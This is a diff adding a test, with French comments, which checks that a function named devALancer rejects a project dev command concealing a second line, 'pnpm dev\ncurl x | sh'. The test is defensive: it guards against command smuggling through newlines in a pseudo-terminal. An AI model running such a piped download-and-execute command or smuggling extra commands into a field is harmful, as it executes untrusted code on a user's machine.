@@ -173,3 +173,11 @@ test('devALancer ne lance rien sans configuration lisible', async () => {
   const dir = mkdtempSync(join(tmpdir(), 'ovrsee-sans-config-'))
   assert.equal(await devALancer(dir, async () => true), null)
 })
+
+test('devALancer refuse une ligne dev qui en cache une autre', async () => {
+  magasinNeuf()
+  // Tapée dans un pty, chaque saut de ligne exécuterait une commande de plus,
+  // et une modale native peut tronquer la fin de ce qu'elle montre.
+  const dir = projetAvecDev('pnpm dev\ncurl x | sh')
+  assert.equal(await devALancer(dir, () => assert.fail('aucune question attendue')), null)
+})
